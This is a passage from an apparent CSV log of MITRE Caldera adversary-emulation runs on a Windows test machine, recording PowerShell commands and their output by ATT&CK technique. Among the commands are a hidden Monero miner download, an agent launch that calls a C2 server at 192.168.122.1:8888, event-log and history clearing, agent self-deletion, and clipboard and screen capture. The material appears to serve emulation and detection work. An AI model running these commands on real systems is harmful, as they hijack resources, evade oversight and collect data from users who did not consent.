'technique_id': 'T1497.001'}]",['windows'],['psh']
18,Initial-Success,impact,impact :: Resource Hijacking,impact :: ['Crypto (Monero) Mining'],impact :: T1496,operation__stockpile_windows_depfalse_pshtrue__t1496__impact__resource_hijacking__46da2385-cf37-49cb-ba4b-a739c7a19de4__SAVED_2024-03-10_000441,stockpile_windows_depfalse_pshtrue__t1496__impact__resource_hijacking__46da2385-cf37-49cb-ba4b-a739c7a19de4,['46da2385-cf37-49cb-ba4b-a739c7a19de4'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-msvc-win64.zip -OutFile xmrig-6.11.2-msvc-win64.zip;Expand-Archive -LiteralPath xmrig-6.11.2-msvc-win64.zip -DestinationPath .\\;Start-Process "".\\xmrig-6.11.2\\xmrig.exe"" -WindowStyle Hidden;Start-Sleep -Seconds 60;Stop-Process -Name ""xmrig""']",['Download and execute Monero miner (xmrig) for 1 minute'],['Crypto (Monero) Mining'],"[{'tactic': 'impact', 'technique_name': 'Resource Hijacking', 'technique_id': 'T1496'}]",['windows'],['psh']
19,Initial-Success,impact,impact :: Defacement,impact :: ['Leave note'],impact :: T1491,operation__stockpile_windows_depfalse_pshtrue__t1491__impact__defacement__47d08617-5ce1-424a-8cc5-c9c978ce6bf9__SAVED_2024-03-09_235547,stockpile_windows_depfalse_pshtrue__t1491__impact__defacement__47d08617-5ce1-424a-8cc5-c9c978ce6bf9,['47d08617-5ce1-424a-8cc5-c9c978ce6bf9'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"[""Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'""]",['Create a text file for the user to find'],['Leave note'],"[{'tactic': 'impact', 'technique_name': 'Defacement', 'technique_id': 'T1491'}]",['windows'],['psh']
20,Initial-Success,discovery,discovery :: Domain Trust Discovery,discovery :: ['GetDomain'],discovery :: T1482,operation__stockpile_windows_depfalse_pshtrue__t1482__discovery__domain_trust_discovery__6131397e-7765-424e-a594-3d7fb2d93a6a__SAVED_2024-03-09_234659,stockpile_windows_depfalse_pshtrue__t1482__discovery__domain_trust_discovery__6131397e-7765-424e-a594-3d7fb2d93a6a,['6131397e-7765-424e-a594-3d7fb2d93a6a'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Import-Module .\\powerview.ps1 -Force;Get-NetDomain | ConvertTo-Json -Depth 1'],['Determine the Windows Domain of a computer'],['GetDomain'],"[{'tactic': 'discovery', 'technique_name': 'Domain Trust Discovery', 'technique_id': 'T1482'}]",['windows'],['psh']
22,Initial-Success,discovery,discovery :: Password Policy Discovery,discovery :: ['Password Policy'],discovery :: T1201,operation__stockpile_windows_depfalse_pshtrue__t1201__discovery__password_policy_discovery__e82f39e2-56f8-4f19-8376-b007f9ac5f8a__SAVED_2024-03-09_232914,stockpile_windows_depfalse_pshtrue__t1201__discovery__password_policy_discovery__e82f39e2-56f8-4f19-8376-b007f9ac5f8a,['e82f39e2-56f8-4f19-8376-b007f9ac5f8a'],1,1,1,[0],['Force user logoff how long after time expires?:       NeverMinimum password age (days):                          0Maximum password age (days):                          42Minimum password length:                              0Length of password history maintained:                NoneLockout threshold:                                    NeverLockout duration (minutes):                           30Lockout observation window (minutes):                 30Computer role:                                        WORKSTATIONThe command completed successfully.'],[''],['0'],['net accounts'],['Password Policy Discovery'],['Password Policy'],"[{'tactic': 'discovery', 'technique_name': 'Password Policy Discovery', 'technique_id': 'T1201'}]",['windows'],['psh']
23,Initial-Success,discovery,discovery :: Network Share Discovery,discovery :: ['View admin shares'],discovery :: T1135,operation__stockpile_windows_depfalse_pshtrue__t1135__discovery__network_share_discovery__530e47c6-8592-42bf-91df-c59ffbd8541b__SAVED_2024-03-09_232016,stockpile_windows_depfalse_pshtrue__t1135__discovery__network_share_discovery__530e47c6-8592-42bf-91df-c59ffbd8541b,['530e47c6-8592-42bf-91df-c59ffbd8541b'],1,1,1,[0],"['[    {        ""CimClass"":  {                         ""CimSuperClassName"":  null,                         ""CimSuperClass"":  null,                         ""CimClassProperties"":  ""AvailabilityType CachingMode CATimeout ConcurrentUserLimit ContinuouslyAvailable CurrentUsers Description EncryptData FolderEnumerationMode IdentityRemoting Infrastructure LeasingMode Name Path Scoped ScopeName SecurityDescriptor ShadowCopy ShareState ShareType SmbInstance Special Temporary Volume"",                         ""CimClassQualifiers"":  ""ClassVersion = \\""30\\"" Description = \\""31\\"" dynamic = True provider = \\""smbwmiv2\\"""",                         ""CimClassMethods"":  ""CreateShare GrantAccess RevokeAccess BlockAccess UnblockAccess GetAccessControlEntries EnumerateShares GetShare FireShareChangeEvent"",                         ""CimSystemProperties"":  ""Microsoft.Management.Infrastructure.CimSystemProperties""                     },        ""CimInstanceProperties"":  [                                      ""AvailabilityType = 0"",                                      ""CachingMode = 1"",                                      ""CATimeout = 0"",                                      ""ConcurrentUserLimit = 0"",                                      ""ContinuouslyAvailable = False"",                                      ""CurrentUsers = 0"",                                      ""Description = \\""Remote Admin\\"""",                                      ""EncryptData = False"",                                      ""FolderEnumerationMode = 1"",                                      ""IdentityRemoting = False"",                                      ""Infrastructure = False"",                                      ""LeasingMode = 0"",                                      ""Name = \\""ADMIN?\\"""",                                      ""Path = \\""C:\\\\WINDOWS\\"""",                                      ""Scoped = False"",                                      ""ScopeName = \\""*\\"""",                                      ""SecurityDescriptor = \\""O:SYG:SYD:(A;;GA;;;BA)(A;;GA;;;BO)(A;;G..."",                                      ""ShadowCopy = False"",                                      ""ShareState = 1"",                                      ""ShareType = 0"",                                      ""SmbInstance = 0"",                                      ""Special = True"",                                      ""Temporary = False"",                                      ""Volume = \\""\\\\\\\\?\\\\Volume{99192ef2-0000-0000-0000-4024...""                                  ],        ""CimSystemProperties"":  {                                    ""Namespace"":  ""ROOT/Microsoft/Windows/SMB"",                                    ""ServerName"":  ""DESKTOP-9LD827I"",                                    ""ClassName"":  ""MSFT_SmbShare"",                                    ""Path"":  null                                },        ""PresetPathAcl"":  null,        ""ShareState"":  1,        ""AvailabilityType"":  0,        ""ShareType"":  0,        ""FolderEnumerationMode"":  1,        ""CachingMode"":  1,        ""LeasingMode"":  0,        ""SmbInstance"":  0,        ""CATimeout"":  0,        ""ConcurrentUserLimit"":  0,        ""ContinuouslyAvailable"":  false,        ""CurrentUsers"":  0,        ""Description"":  ""Remote Admin"",        ""EncryptData"":  false,        ""IdentityRemoting"":  false,        ""Infrastructure"":  false,        ""Name"":  ""ADMIN$"",        ""Path"":  ""C:\\\\WINDOWS"",        ""Scoped"":  false,        ""ScopeName"":  ""*"",        ""SecurityDescriptor"":  ""O:SYG:SYD:(A;;GA;;;BA)(A;;GA;;;BO)(A;;GA;;;IU)"",        ""ShadowCopy"":  false,        ""Special"":  true,        ""Temporary"":  false,        ""Volume"":  ""\\\\\\\\?\\\\Volume{99192ef2-0000-0000-0000-402400000000}\\\\"",        ""PSComputerName"":  null    },    {        ""CimClass"":  {                         ""CimSuperClassName"":  null,                         ""CimSuperClass"":  null,                         ""CimClassProperties"":  ""AvailabilityType CachingMode CATimeout ConcurrentUserLimit ContinuouslyAvailable CurrentUsers Description EncryptData FolderEnumerationMode IdentityRemoting Infrastructure LeasingMode Name Path Scoped ScopeName SecurityDescriptor ShadowCopy ShareState ShareType SmbInstance Special Temporary Volume"",                         ""CimClassQualifiers"":  ""ClassVersion = \\""30\\"" Description = \\""31\\"" dynamic = True provider = \\""smbwmiv2\\"""",                         ""CimClassMethods"":  ""CreateShare GrantAccess RevokeAccess BlockAccess UnblockAccess GetAccessControlEntries EnumerateShares GetShare FireShareChangeEvent"",                         ""CimSystemProperties"":  ""Microsoft.Management.Infrastructure.CimSystemProperties""                     },        ""CimInstanceProperties"":  [                                      ""AvailabilityType = 0"",                                      ""CachingMode = 1"",                                      ""CATimeout = 0"",                                      ""ConcurrentUserLimit = 0"",                                      ""ContinuouslyAvailable = False"",                                      ""CurrentUsers = 0"",                                      ""Description = \\""Default share\\"""",                                      ""EncryptData = False"",                                      ""FolderEnumerationMode = 1"",                                      ""IdentityRemoting = False"",                                      ""Infrastructure = False"",                                      ""LeasingMode = 0"",                                      ""Name = \\""C?\\"""",                                      ""Path = \\""C:\\\\\\"""",                                      ""Scoped = False"",                                      ""ScopeName = \\""*\\"""",                                      ""SecurityDescriptor = \\""O:SYG:SYD:(A;;GA;;;BA)(A;;GA;;;BO)(A;;G..."",                                      ""ShadowCopy = False"",                                      ""ShareState = 1"",                                      ""ShareType = 0"",                                      ""SmbInstance = 0"",                                      ""Special = True"",                                      ""Temporary = False"",                                      ""Volume = \\""\\\\\\\\?\\\\Volume{99192ef2-0000-0000-0000-4024...""                                  ],        ""CimSystemProperties"":  {                                    ""Namespace"":  ""ROOT/Microsoft/Windows/SMB"",                                    ""ServerName"":  ""DESKTOP-9LD827I"",                                    ""ClassName"":  ""MSFT_SmbShare"",                                    ""Path"":  null                                },        ""PresetPathAcl"":  null,        ""ShareState"":  1,        ""AvailabilityType"":  0,        ""ShareType"":  0,        ""FolderEnumerationMode"":  1,        ""CachingMode"":  1,        ""LeasingMode"":  0,        ""SmbInstance"":  0,        ""CATimeout"":  0,        ""ConcurrentUserLimit"":  0,        ""ContinuouslyAvailable"":  false,        ""CurrentUsers"":  0,        ""Description"":  ""Default share"",        ""EncryptData"":  false,        ""IdentityRemoting"":  false,        ""Infrastructure"":  false,        ""Name"":  ""C$"",        ""Path"":  ""C:\\\\"",        ""Scoped"":  false,        ""ScopeName"":  ""*"",        ""SecurityDescriptor"":  ""O:SYG:SYD:(A;;GA;;;BA)(A;;GA;;;BO)(A;;GA;;;IU)"",        ""ShadowCopy"":  false,        ""Special"":  true,        ""Temporary"":  false,        ""Volume"":  ""\\\\\\\\?\\\\Volume{99192ef2-0000-0000-0000-402400000000}\\\\"",        ""PSComputerName"":  null    },    {        ""CimClass"":  {                         ""CimSuperClassName"":  null,                         ""CimSuperClass"":  null,                         ""CimClassProperties"":  ""AvailabilityType CachingMode CATimeout ConcurrentUserLimit ContinuouslyAvailable CurrentUsers Description EncryptData FolderEnumerationMode IdentityRemoting Infrastructure LeasingMode Name Path Scoped ScopeName SecurityDescriptor ShadowCopy ShareState ShareType SmbInstance Special Temporary Volume"",                         ""CimClassQualifiers"":  ""ClassVersion = \\""30\\"" Description = \\""31\\"" dynamic = True provider = \\""smbwmiv2\\"""",                         ""CimClassMethods"":  ""CreateShare GrantAccess RevokeAccess BlockAccess UnblockAccess GetAccessControlEntries EnumerateShares GetShare FireShareChangeEvent"",                         ""CimSystemProperties"":  ""Microsoft.Management.Infrastructure.CimSystemProperties""                     },        ""CimInstanceProperties"":  [                                      ""AvailabilityType = 0"",                                      ""CachingMode = 1"",                                      ""CATimeout = 0"",                                      ""ConcurrentUserLimit = 0"",                                      ""ContinuouslyAvailable = False"",                                      ""CurrentUsers = 0"",                                      ""Description = \\""Remote IPC\\"""",                                      ""EncryptData = False"",                                      ""FolderEnumerationMode = 1"",                                      ""IdentityRemoting = False"",                                      ""Infrastructure = False"",                                      ""LeasingMode = 0"",                                      ""Name = \\""IPC?\\"""",                                      ""Path = \\""\\"""",                                      ""Scoped = False"",                                      ""ScopeName = \\""*\\"""",                                      ""SecurityDescriptor = \\""O:SYG:SYD:(A;;GA;;;BA)(A;;GA;;;BO)(A;;G..."",                                      ""ShadowCopy = False"",                                      ""ShareState = 1"",                                      ""ShareType = 3"",                                      ""SmbInstance = 0"",                                      ""Special = True"",                                      ""Temporary = False"",                                      ""Volume""                                  ],        ""CimSystemProperties"":  {                                    ""Namespace"":  ""ROOT/Microsoft/Windows/SMB"",                                    ""ServerName"":  ""DESKTOP-9LD827I"",                                    ""ClassName"":  ""MSFT_SmbShare"",                                    ""Path"":  null                                },        ""PresetPathAcl"":  null,        ""ShareState"":  1,        ""AvailabilityType"":  0,        ""ShareType"":  3,        ""FolderEnumerationMode"":  1,        ""CachingMode"":  1,        ""LeasingMode"":  0,        ""SmbInstance"":  0,        ""CATimeout"":  0,        ""ConcurrentUserLimit"":  0,        ""ContinuouslyAvailable"":  false,        ""CurrentUsers"":  0,        ""Description"":  ""Remote IPC"",        ""EncryptData"":  false,        ""IdentityRemoting"":  false,        ""Infrastructure"":  false,        ""Name"":  ""IPC$"",        ""Path"":  """",        ""Scoped"":  false,        ""ScopeName"":  ""*"",        ""SecurityDescriptor"":  ""O:SYG:SYD:(A;;GA;;;BA)(A;;GA;;;BO)(A;;GA;;;IU)"",        ""ShadowCopy"":  false,        ""Special"":  true,        ""Temporary"":  false,        ""Volume"":  null,        ""PSComputerName"":  null    }]']",[''],['0'],['Get-SmbShare | ConvertTo-Json'],['Network Share Discovery'],['View admin shares'],"[{'tactic': 'discovery', 'technique_name': 'Network Share Discovery', 'technique_id': 'T1135'}]",['windows'],['psh']
24,Initial-Success,discovery,discovery :: System Time Discovery,discovery :: ['Get System Time'],discovery :: T1124,operation__stockpile_windows_depfalse_pshtrue__t1124__discovery__system_time_discovery__fa6e8607-e0b1-425d-8924-9b894da5a002__SAVED_2024-03-09_231117,stockpile_windows_depfalse_pshtrue__t1124__discovery__system_time_discovery__fa6e8607-e0b1-425d-8924-9b894da5a002,['fa6e8607-e0b1-425d-8924-9b894da5a002'],1,1,1,[0],['2024-03-09T23:09:01Z'],[''],['0'],"[""Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'""]",['get current system time (ISO 8601)'],['Get System Time'],"[{'tactic': 'discovery', 'technique_name': 'System Time Discovery', 'technique_id': 'T1124'}]",['windows'],['psh']
25,Initial-Success,collection,collection :: Clipboard Data,collection :: ['Copy Clipboard'],collection :: T1115,operation__stockpile_windows_depfalse_pshtrue__t1115__collection__clipboard_data__b007fe0c-c6b0-4fda-915c-255bbc070de2__SAVED_2024-03-09_225321,stockpile_windows_depfalse_pshtrue__t1115__collection__clipboard_data__b007fe0c-c6b0-4fda-915c-255bbc070de2,['b007fe0c-c6b0-4fda-915c-255bbc070de2'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Get-Clipboard -raw'],['copy the contents for the clipboard and print them'],['Copy Clipboard'],"[{'tactic': 'collection', 'technique_name': 'Clipboard Data', 'technique_id': 'T1115'}]",['windows'],['psh']
26,Initial-Success,collection,collection :: Screen Capture,collection :: ['Screen Capture'],collection :: T1113,operation__stockpile_windows_depfalse_pshtrue__t1113__collection__screen_capture__316251ed-6a28-4013-812b-ddf5b5b007f8__SAVED_2024-03-09_224430,stockpile_windows_depfalse_pshtrue__t1113__collection__screen_capture__316251ed-6a28-4013-812b-ddf5b5b007f8,['316251ed-6a28-4013-812b-ddf5b5b007f8'],1,1,1,[0],['C:\\Users\\puma-4\\Desktop\\screenshot.png'],[''],['0'],"['$loadResult = [Reflection.Assembly]::LoadWithPartialName(""System.Drawing"");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = ""$HOME\\Desktop\\screenshot.png"";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;']",['capture the contents of the screen'],['Screen Capture'],"[{'tactic': 'collection', 'technique_name': 'Screen Capture', 'technique_id': 'T1113'}]",['windows'],['psh']
27,Initial-Success,command-and-control,command-and-control :: Ingress Tool Transfer,command-and-control :: ['Install PSTools'],command-and-control :: T1105,operation__stockpile_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__eb814e03-811a-467a-bc6d-dcd453750fa2__SAVED_2024-03-09_223536,stockpile_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__eb814e03-811a-467a-bc6d-dcd453750fa2,['eb814e03-811a-467a-bc6d-dcd453750fa2'],1,1,1,[0],['    Directory: C:\\Windows\\System32Mode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 d-----          3/9/2024  10:33 PM                PSTools                                                              '],[''],['0'],"['[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };$web = (New-Object System.Net.WebClient);$result = $web.DownloadFile(""https://download.sysinternals.com/files/PSTools.zip"", ""PSTools.zip"");New-Item -ItemType ""directory"" C:\\Windows\\System32\\PSTools -Force;Add-Type -Assembly \'System.IO.Compression.FileSystem\'; [System.IO.Compression.ZipFile]::ExtractToDirectory(""PSTools.zip"", ""C:\\Windows\\System32\\PSTools"");']",['Download and install PSTools by unzipping the file'],['Install PSTools'],"[{'tactic': 'command-and-control', 'technique_name': 'Ingress Tool Transfer', 'technique_id': 'T1105'}]",['windows'],['psh']
28,Initial-Success,command-and-control,command-and-control :: Ingress Tool Transfer,command-and-control :: ['Install PowerShell Core 6'],command-and-control :: T1105,operation__stockpile_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__60f63260-39bb-4136-87a0-b6c2dca799fc__SAVED_2024-03-09_222636,stockpile_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__60f63260-39bb-4136-87a0-b6c2dca799fc,['60f63260-39bb-4136-87a0-b6c2dca799fc'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$wc=New-Object System.Net.WebClient;$output=""PowerShellCore.msi"";$wc.DownloadFile(""https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi"", $output);Start-Process msiexec.exe -ArgumentList ""/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1"" -Wait;$env:Path += "";C:\\Program Files\\Powershell\\6"";Start-Process pwsh -ArgumentList ""-c C:\\Users\\Public\\splunkd.exe -server http://192.168.122.1:8888 - group red"" -WindowStyle hidden;']","['Download, install and start new process under PowerShell Core 6']",['Install PowerShell Core 6'],"[{'tactic': 'command-and-control', 'technique_name': 'Ingress Tool Transfer', 'technique_id': 'T1105'}]",['windows'],['psh']
29,Initial-Success,discovery,discovery :: Account Discovery: Local Account,discovery :: ['Identify local users'],discovery :: T1087.001,operation__stockpile_windows_depfalse_pshtrue__t1087_001__discovery__account_discovery-_local_account__feaced8f-f43f-452a-9500-a5219488abb8__SAVED_2024-03-09_221744,stockpile_windows_depfalse_pshtrue__t1087_001__discovery__account_discovery-_local_account__feaced8f-f43f-452a-9500-a5219488abb8,['feaced8f-f43f-452a-9500-a5219488abb8'],1,1,1,[0],['AccountType : 512Caption     : DESKTOP-9LD827I\\AdministratorDomain      : DESKTOP-9LD827ISID         : S-1-5-21-2334472832-2587113924-773976260-500FullName    : Name        : AdministratorAccountType : 512Caption     : DESKTOP-9LD827I\\DefaultAccountDomain      : DESKTOP-9LD827ISID         : S-1-5-21-2334472832-2587113924-773976260-503FullName    : Name        : DefaultAccountAccountType : 512Caption     : DESKTOP-9LD827I\\GuestDomain      : DESKTOP-9LD827ISID         : S-1-5-21-2334472832-2587113924-773976260-501FullName    : Name        : GuestAccountType : 512Caption     : DESKTOP-9LD827I\\puma-4Domain      : DESKTOP-9LD827ISID         : S-1-5-21-2334472832-2587113924-773976260-1001FullName    : Name        : puma-4AccountType : 512Caption     : DESKTOP-9LD827I\\sshdDomain      : DESKTOP-9LD827ISID         : S-1-5-21-2334472832-2587113924-773976260-1002FullName    : sshdName        : sshdAccountType : 512Caption     : DESKTOP-9LD827I\\userDomain      : DESKTOP-9LD827ISID         : S-1-5-21-2334472832-2587113924-773976260-1003FullName    : Name        : userAccountType : 512Caption     : DESKTOP-9LD827I\\WDAGUtilityAccountDomain      : DESKTOP-9LD827ISID         : S-1-5-21-2334472832-2587113924-773976260-504FullName    : Name        : WDAGUtilityAccount'],[''],['0'],['Get-WmiObject -Class Win32_UserAccount'],['Identify all local users'],['Identify local users'],"[{'tactic': 'discovery', 'technique_name': 'Account Discovery: Local Account', 'technique_id': 'T1087.001'}]",['windows'],['psh']
30,Initial-Success,discovery,discovery :: File and Directory Discovery,discovery :: ['List Directory'],discovery :: T1083,operation__stockpile_windows_depfalse_pshtrue__t1083__discovery__file_and_directory_discovery__52177cc1-b9ab-4411-ac21-2eadc4b5d3b8__SAVED_2024-03-09_215947,stockpile_windows_depfalse_pshtrue__t1083__discovery__file_and_directory_discovery__52177cc1-b9ab-4411-ac21-2eadc4b5d3b8,['52177cc1-b9ab-4411-ac21-2eadc4b5d3b8'],1,1,1,[0],['    Directory: C:\\Users\\puma-4\\DesktopMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 d-----        10/11/2023   6:05 PM                logstash-8.10.0                                                      -a----          3/4/2024   7:49 PM          15623 agent_for_custom_caldera_adv.py                                      -a----         1/23/2021   9:14 PM         547797 Unpackers.zip                                                        -a----         11/3/2023   3:56 PM           1403 Visual Studio Code.lnk                                               '],[''],['0'],['dir'],['List contents of current directory'],['List Directory'],"[{'tactic': 'discovery', 'technique_name': 'File and Directory Discovery', 'technique_id': 'T1083'}]",['windows'],['psh']
31,Initial-Success,discovery,discovery :: File and Directory Discovery,discovery :: ['Print Working Directory'],discovery :: T1083,operation__stockpile_windows_depfalse_pshtrue__t1083__discovery__file_and_directory_discovery__6e1a53c0-7352-4899-be35-fa7f364d5722__SAVED_2024-03-09_220848,stockpile_windows_depfalse_pshtrue__t1083__discovery__file_and_directory_discovery__6e1a53c0-7352-4899-be35-fa7f364d5722,['6e1a53c0-7352-4899-be35-fa7f364d5722'],1,1,1,[0],['Path                   ----                   C:\\Users\\puma-4\\Desktop'],[''],['0'],['pwd'],['Print the current working directory on the system'],['Print Working Directory'],"[{'tactic': 'discovery', 'technique_name': 'File and Directory Discovery', 'technique_id': 'T1083'}]",['windows'],['psh']
32,Initial-Success,discovery,discovery :: System Information Discovery,discovery :: ['Find OS Version'],discovery :: T1082,operation__stockpile_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__b6b105b9-41dc-490b-bc5c-80d699b82ce8__SAVED_2024-03-09_215055,stockpile_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__b6b105b9-41dc-490b-bc5c-80d699b82ce8,['b6b105b9-41dc-490b-bc5c-80d699b82ce8'],1,1,1,[0],['Major  Minor  Build  Revision-----  -----  -----  --------10     0      19045  0       '],[''],['0'],['[environment]::OSVersion.Version'],['Find OS Version'],['Find OS Version'],"[{'tactic': 'discovery', 'technique_name': 'System Information Discovery', 'technique_id': 'T1082'}]",['windows'],['psh']
33,Initial-Success,discovery,discovery :: System Information Discovery,discovery :: ['PowerShell version'],discovery :: T1082,operation__stockpile_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__29451844-9b76-4e16-a9ee-d6feab4b24db__SAVED_2024-03-09_214207,stockpile_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__29451844-9b76-4e16-a9ee-d6feab4b24db,['29451844-9b76-4e16-a9ee-d6feab4b24db'],1,1,1,[0],"['Name                           Value                                                                                   ----                           -----                                                                                   PSVersion                      5.1.19041.3570                                                                          PSEdition                      Desktop                                                                                 PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}                                                                 BuildVersion                   10.0.19041.3570                                                                         CLRVersion                     4.0.30319.42000                                                                         WSManStackVersion              3.0                                                                                     PSRemotingProtocolVersion      2.3                                                                                     SerializationVersion           1.1.0.1                                                                                 ']",[''],['0'],['$PSVersionTable'],['Discover the PowerShell version'],['PowerShell version'],"[{'tactic': 'discovery', 'technique_name': 'System Information Discovery', 'technique_id': 'T1082'}]",['windows'],['psh']
34,Initial-Success,collection,collection :: Data Staged: Local Data Staging,collection :: ['Create staging directory'],collection :: T1074.001,operation__stockpile_windows_depfalse_pshtrue__t1074_001__collection__data_staged-_local_data_staging__6469befa-748a-4b9c-a96d-f191fde47d89__SAVED_2024-03-09_213314,stockpile_windows_depfalse_pshtrue__t1074_001__collection__data_staged-_local_data_staging__6469befa-748a-4b9c-a96d-f191fde47d89,['6469befa-748a-4b9c-a96d-f191fde47d89'],1,1,1,[0],['C:\\Users\\puma-4\\Desktop\\staged'],[''],['0'],"['New-Item -Path ""."" -Name ""staged"" -ItemType ""directory"" -Force | foreach {$_.FullName} | Select-Object']",['create a directory for exfil staging'],['Create staging directory'],"[{'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}]",['windows'],['psh']
35,Initial-Success,defense-evasion,defense-evasion :: Indicator Removal on Host: File Deletion,defense-evasion :: ['Deadman - Delete agent file'],defense-evasion :: T1070.004,operation__stockpile_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__5f844ac9-5f24-4196-a70d-17f0bd44a934__SAVED_2024-03-09_212424,stockpile_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__5f844ac9-5f24-4196-a70d-17f0bd44a934,['5f844ac9-5f24-4196-a70d-17f0bd44a934'],1,1,1,[0],['ProcessId ReturnValue PSComputerName--------- ----------- --------------     6540           0               '],[''],['0'],"['$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;$processClass = Get-CimClass -ClassName Win32_Process;Invoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{    Commandline = \'cmd.exe /c ""timeout /nobreak /t 10 >nul 2>nul & del /f C:\\Users\\Public\\splunkd.exe""\';    ProcessStartupInformation = [CimInstance]$startupInfo};']",['Deadman ability to delete agent file after termination.'],['Deadman - Delete agent file'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: File Deletion', 'technique_id': 'T1070.004'}]",['windows'],['psh']
36,Initial-Success,defense-evasion,defense-evasion :: Indicator Removal on Host: Clear Command History,defense-evasion :: ['Avoid logs'],defense-evasion :: T1070.003,operation__stockpile_windows_depfalse_pshtrue__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__43b3754c-def4-4699-a673-1d85648fda6a__SAVED_2024-03-09_210645,stockpile_windows_depfalse_pshtrue__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__43b3754c-def4-4699-a673-1d85648fda6a,['43b3754c-def4-4699-a673-1d85648fda6a'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Clear-History;Clear'],['Stop terminal from logging history'],['Avoid logs'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: Clear Command History', 'technique_id': 'T1070.003'}]",['windows'],['psh']
37,Initial-Success,defense-evasion,defense-evasion :: Indicator Removal on Host: Clear Windows Event Logs,defense-evasion :: ['Clear Logs'],defense-evasion :: T1070.001,operation__stockpile_windows_depfalse_pshtrue__t1070_001__defense-evasion__indicator_removal_on_host-_clear_windows_event_logs__fcf71ee3-d1a9-4136-b919-9e5f6da43608__SAVED_2024-03-09_205758,stockpile_windows_depfalse_pshtrue__t1070_001__defense-evasion__indicator_removal_on_host-_clear_windows_event_logs__fcf71ee3-d1a9-4136-b919-9e5f6da43608,['fcf71ee3-d1a9-4136-b919-9e5f6da43608'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Clear-Eventlog Security;Clear-Eventlog System;'],['Clear Sysmon logs [intended to trigger CAR-2016-04-002]'],['Clear Logs'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: Clear Windows Event Logs', 'technique_id': 'T1070.001'}]",['windows'],['psh']
38,Initial-Success,discovery,discovery :: Permission Groups Discovery: Local Groups,discovery :: ['Permission Groups Discovery'],discovery :: T1069.001,operation__stockpile_windows_depfalse_pshtrue__t1069_001__discovery__permission_groups_discovery-_local_groups__5c4dd985-89e3-4590-9b57-71fed66ff4e2__SAVED_2024-03-09_202123,stockpile_windows_depfalse_pshtrue__t1069_001__discovery__permission_groups_discovery-_local_groups__5c4dd985-89e3-4590-9b57-71fed66ff4e2,['5c4dd985-89e3-4590-9b57-71fed66ff4e2'],1,1,1,[0],['Microsoft (R) Windows (R) Operating System Group Policy Result tool v2.0c Microsoft Corporation. All rights reserved.Created on ?3/?9/?2024 at 8:19:06 PM\rRSOP data for DESKTOP-9LD827I\\puma-4 on DESKTOP-9LD827I : Logging Mode-----------------------------------------------------------------------OS Configuration:            Standalone WorkstationOS Version:                  10.0.19045Site Name:                   N/ARoaming Profile:             N/ALocal Profile:               C:\\Users\\puma-4Connected over a slow link?: NoCOMPUTER SETTINGS------------------        Last time Group Policy was applied: 3/8/2024 at 12:44:31 PM    Group Policy was applied from:      N/A    Group Policy slow link threshold:   500 kbps    Domain Name:                        DESKTOP-9LD827I    Domain Type:                        <Local Computer>    Applied Group Policy Objects    -----------------------------        Local Group Policy    The computer is a part of the following security groups    -------------------------------------------------------        BUILTIN\\Administrators        Everyone        NT AUTHORITY\\Authenticated Users        